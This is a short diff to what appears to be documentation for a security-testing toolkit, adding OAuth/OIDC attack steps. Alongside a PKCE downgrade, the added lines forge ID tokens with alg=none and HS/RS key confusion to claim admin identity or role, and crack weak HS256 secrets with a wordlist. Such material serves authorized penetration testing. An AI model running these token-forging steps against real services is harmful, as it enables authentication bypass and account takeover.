@@ -77,6 +77,13 @@ session_request(name="user", method="POST", path="/oauth/token",
 # 3) PKCE downgrade
 # Capture flow, then resend /authorize without code_challenge — modify via Burp:
 resend_with_modification(index=<authorize_idx>, modify_path="/authorize?client_id=...&redirect_uri=...")  # strip pkce
+
+# 4) id_token alg=none / claim manipulation — use forge_jwt instead of manual encoding
+forge_jwt(token="<captured_id_token>", mode="alg_none", claim_changes={"sub": "admin", "email": "admin@target.tld"})
+forge_jwt(token="<captured_id_token>", mode="hs_confusion", public_key_pem="<server_pubkey>", claim_changes={"role": "admin"})
+
+# 5) HS256 weak-secret check — built-in 200-secret wordlist runs in <1s
+crack_jwt_secret(token="<captured_jwt>")
 ```
 
 ### Save template
